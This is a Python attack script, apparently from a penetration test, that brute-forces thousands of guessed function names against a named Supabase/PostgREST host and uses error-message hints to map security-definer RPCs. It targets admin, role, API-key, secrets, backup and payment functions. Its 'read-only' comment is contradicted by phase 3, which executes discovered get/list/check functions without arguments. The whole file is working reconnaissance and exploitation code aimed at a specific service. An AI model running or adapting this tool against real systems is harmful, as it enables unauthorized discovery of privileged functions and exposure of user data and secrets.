#!/usr/bin/env python3
# P2 (threaded): exhaustive SECURITY DEFINER RPC namespace mining via PostgREST PGRST202 hint oracle.
# Read-only crawl: every probe carries an extra bogus arg (zz_probe) so no function is executed by discovery.
# 3 paced keep-alive workers -> ~2 req/s aggregate (within RoE).
import json, re, sys, time, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
sys.stdout.reconfigure(encoding="utf-8")
from fast_client import FastHTTP

PK = "<publishable-key>"
HINT = re.compile(r"Perhaps you meant to call the function public\.([A-Za-z0-9_]+(?:\([^)]*\))?)")
known = {
 "get_total_counts", "get_recent_activity", "get_job_status_counts", "is_admin",
 "get_jobs_time_series", "get_profiles_time_series", "get_admin_credit_leaderboard",
 "cleanup_expired_payment_assignments", "credit_tokens_after_payment",
 "deduct_credits", "deduct_generation", "grant_plan_credits", "remove_watermark_and_deduct_token",
}
found = {}
lock = threading.Lock()
probed = 0
t0 = time.time()
WORKERS = 3

def worker_get(name):
    C = FastHTTP("cdn.onlyfakeai.ru", PK)
    for _ in range(2):
        st, txt, _h = C.request("GET", f"/rest/v1/rpc/{name}?zz_probe=1")
        time.sleep(0.45)
        if st != "ERR":
            break
    return name, st, txt

def harvest(siglist, txt):
    with lock:
        for sig in HINT.findall(txt or ""):
            fn = sig.split("(")[0]
            if fn not in found:
                found[fn] = sig
                if fn not in known:
                    print(f"[NEW-FN] {fn}   signature={sig}", flush=True)

def crawl(names, tag, maxn=None):
    global probed
    names = names[:maxn] if maxn else names
    t = time.time()
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(worker_get, n): n for n in names}
        for i, fu in enumerate(as_completed(futs)):
            name, st, txt = fu.result()
            with lock:
                probed += 1
            harvest(None, txt)
            if st in (200, 204) and name not in known:
                print(f"[LIVE?] {name} -> {st} {txt[:120]}", flush=True)
            if st == 429:
                print("[429] backoff 15s", flush=True); time.sleep(15)
            if i % 150 == 0:
                print(f"... {tag} {i}/{len(names)} new={len([f for f in found if f not in known])} "
                      f"rate={i/(time.time()-t+0.001):.1f}/s elapsed={time.time()-t0:.0f}s", flush=True)
    print(f"{tag} done in {time.time()-t:.0f}s (rate {len(names)/(time.time()-t+0.001):.1f}/s)", flush=True)

verbs = """get list count fetch read check verify validate find lookup search admin set update grant deduct credit
add remove delete revoke promote demote ban unban assign unassign create insert change toggle log sync refresh
cleanup expire notify send generate reset refund""".split()
nouns = """admin admins super_admin role user users profile profiles job jobs credit credits token tokens generation
generations plan plans payment payments transaction transactions assignment assignments activity activities log logs
audit api_key api_keys key keys usage quota stats statistics metric metrics count counts summary report reports
dashboard leaderboard time_series series watermark email emails telegram session sessions message messages
conversation conversations support ticket tickets flag flags ban bans referral coupon promo price product template
document country revision worker server queue notification webhook setting settings config secret permission mfa otp
invite recovery password backup export invoice receipt wallet balance order purchase subscription trial discount
history api key_hash""".split()
cands = set()
for v in verbs:
    for n in nouns:
        cands.add(f"{v}_{n}")
mid = ["admin","user","credit","payment","job","profile","api"]
tail = ["activity","log","stats","history","summary","counts"]
for v in ["get","admin","set","update","grant"]:
    for m in mid:
        for t in tail:
            cands.add(f"{v}_{m}_{t}")
cands.update("""validate_api_key verify_api_key check_api_key api_key_auth get_api_key lookup_api_key find_api_key
resolve_api_key authenticate_api_key hash_api_key generate_api_key create_api_key revoke_api_key
get_key_by_hash find_key_by_hash lookup_key_by_hash key_by_hash validate_key verify_key
set_user_role update_user_role change_user_role assign_role grant_role grant_admin set_admin make_admin add_admin
remove_admin revoke_admin promote_user promote_admin demote_admin create_admin set_profile_role update_profile_role
admin_set_role admin_update_role admin_grant_role admin_promote_user grant_admin_access set_user_admin make_user_admin
toggle_admin is_super_admin get_user_role get_role set_role update_role get_user_by_email get_profile_by_email
find_user_by_email lookup_user search_users get_users list_users get_user_list get_user_details get_user_data
get_full_profile get_profile_with_email get_profile_data get_profile_info get_user_info get_user_email
get_user_credits get_user_plan get_user_payments get_user_jobs get_user_activity get_user_log get_credit_history
get_generations_history get_payment_info get_payment_history get_job_details get_job_history get_watermark_stats
get_no_watermark_jobs get_flagged_users get_banned_users get_admin_activity get_admin_activity_log get_admin_logs
get_admin_audit get_admin_summary get_admin_stats get_admin_metrics get_admin_counts get_admin_users get_admin_list
get_admin_emails get_admin_credits get_admin_payments get_admin_plans get_admin_revenue get_admin_api_keys
get_admin_data get_admin_dashboard get_admin_actions get_admin_action_log get_admin_credit_stats
get_admin_credit_history get_credit_leaderboard get_credits_leaderboard admin_credit_leaderboard
get_dashboard_stats get_dashboard_metrics get_analytics_summary get_analytics get_metrics get_stats get_summary
get_total_stats get_total_users get_total_profiles get_total_jobs get_total_credits get_total_payments
get_recent_users get_recent_profiles get_recent_jobs get_recent_signups get_recent_payments get_payment_assignments
get_payment_assignment get_assignments get_expired_assignments get_expiring_assignments
cleanup_expired_assignments expire_payment_assignments cleanup_payment_assignments cleanup_expired_payments
get_payment_stats get_plan_stats get_usage_stats get_usage_metrics get_quota_usage get_api_key_usage
get_api_key_stats get_key_usage get_rate_limit get_ratelimit get_rate_limits send_telegram_message
send_telegram_notify send_admin_notification send_notification notify_admin notify_user get_telegram_user
get_telegram_users get_telegram_session get_telegram_bot get_bot_token get_email_template get_email_logs
get_email_settings get_smtp_settings get_settings get_site_settings get_app_settings get_config get_system_config
get_secrets get_env get_environment get_feature_flags get_flags get_experiments log_admin_action record_admin_action
insert_admin_activity track_activity log_activity log_user_action get_admin_activity_stats get_activity_log
get_activity_logs admin_activity admin_activity_log admin_activity_stats get_profiles_stats get_jobs_stats
get_job_statuses get_status_counts get_profile_counts get_user_counts get_signup_counts get_conversations
get_conversation get_messages get_message get_support_tickets get_tickets get_ticket reply_to_ticket
send_support_message create_conversation get_unread_messages get_chat_messages generate_report export_report
export_profiles export_jobs export_users export_data download_report get_backup create_backup list_backups
restore_backup backup_database dump_database health_check healthcheck ping get_health get_status get_version get_info
get_server_status get_worker_status get_worker_stats get_workers get_servers get_queue_status get_queues
get_jobs_queue get_processing_jobs get_failed_jobs get_jobs_stats get_job_stats get_job_counts get_document_stats
get_country_stats get_template_stats get_product_stats get_sales_stats get_revenue_stats get_income_stats
get_transaction_stats get_trial_users get_trial_stats get_subscription_stats get_plan_distribution
get_credit_usage get_credit_stats get_plan_usage get_plan_breakdown get_active_plans get_payment_methods
get_crypto_payments get_usdt_payments get_user_balance get_wallet_balance get_user_wallet get_ledger
get_ledger_entries get_accounting get_audit_trail get_audit_logs get_audit_log get_security_log
get_login_attempts get_failed_logins get_sessions get_active_sessions get_user_sessions get_session_data
get_all_api_keys list_api_keys get_api_key_list get_api_key_details send_otp send_verification send_recovery
send_magic_link generate_link generate_invite create_invite verify_token validate_token check_token get_token
get_tokens revoke_token revoke_session revoke_tokens set_plan set_credits set_generations set_ban set_banned
set_unban set_email set_secret set_remarks update_credits update_generations update_plan update_profile update_user
update_email update_secret update_banned admin_update_credits admin_update_plan admin_update_profile admin_update_user
admin_set_credits admin_set_plan admin_set_banned admin_ban_user admin_unban_user admin_delete_user
admin_delete_profile admin_reset_password admin_generate_link admin_create_user admin_list_users admin_get_user
admin_get_profile admin_search_users admin_stats admin_dashboard admin_leaderboard""".split())
cands -= known
cands = sorted(cands)[:2400]
print(f"P1 candidate function names: {len(cands)}", flush=True)
crawl(cands, "phase1")

def mutations(names):
    out = set()
    for f in names:
        p = f.split("_")
        for i in range(len(p)):
            out.add("_".join(p[:i] + p[i+1:]))
        for i in range(len(p)):
            for r in ["admin","user","credit","plan","payment","activity","log","stats","counts","series","leaderboard",
                      "dashboard","summary","email","role","api_key","job","profile","total"]:
                out.add("_".join(p[:i] + [r] + p[i+1:]))
        for pre in ["get_", "admin_", ""]:
            for suf in ["", "_stats", "_counts", "_list", "_log", "_activity", "_leaderboard", "_history"]:
                out.add(pre + f + suf)
    return out

new_names = [f for f in found if f not in known]
for rnd in range(2):
    muts = sorted(mutations(new_names) - set(found) - set(cands))[:600]
    print(f"mutation round {rnd+1}: {len(muts)}", flush=True)
    crawl(muts, f"mut{rnd+1}")
    new_names = [f for f in found if f not in known]

print("\n== phase 3: signature recovery for new functions ==", flush=True)
sig = dict(found)
arg_sets = [
    {"p_user_id":"00000000-0000-0000-0000-000000000000"},
    {"user_id":"00000000-0000-0000-0000-000000000000"},
    {"p_id":"00000000-0000-0000-0000-000000000000"}, {"id":"1"}, {"p_job_id":"1"},
    {"p_amount":0}, {"p_credits":0}, {"p_generations":0}, {"p_plan_key":"free"},
    {"p_limit":10}, {"p_email":"<probe>@example.invalid"}, {"email":"<probe>@example.invalid"},
    {"start_date":"2026-01-01"}, {"date_trunc_type":"day","start_date":"2026-01-01"},
    {"p_user_id":"00000000-0000-0000-0000-000000000000","p_amount":0},
    {"p_user_id":"00000000-0000-0000-0000-000000000000","p_plan_key":"free"},
]
C = FastHTTP("cdn.onlyfakeai.ru", PK)
for fn in sorted(sig):
    if fn in known: continue
    best = sig.get(fn)
    for args in arg_sets:
        q = "&".join(f"{k}={v}" for k, v in args.items())
        st, txt, _h = C.request("GET", f"/rest/v1/rpc/{fn}?{q}&zz_probe=1")
        time.sleep(0.4)
        h = [x for x in HINT.findall(txt or "") if x.split("(")[0] == fn]
        if h:
            best = h[0]; break
    sig[fn] = best
    print(f"[SIG] {fn} -> {best}", flush=True)
    if fn.split("_")[0] in ("get","list","count","is","has","can","fetch","read","check","find","lookup","search"):
        st, txt, _h = C.request("GET", f"/rest/v1/rpc/{fn}")
        time.sleep(0.4)
        print(f"[EXEC] {fn} no-args -> {st} {txt[:300]}", flush=True)

json.dump({"probed": probed, "elapsed": round(time.time()-t0,1), "found": sig,
           "new": [f for f in sig if f not in known]}, open("probe_p2_results.json","w"), indent=1)
print(f"\nDONE requests={probed} elapsed={time.time()-t0:.0f}s discovered={len(sig)} new={len([f for f in sig if f not in known])}")
for f in sorted(sig):
    if f not in known: print(f"  NEW: {f} :: {sig[f]}")
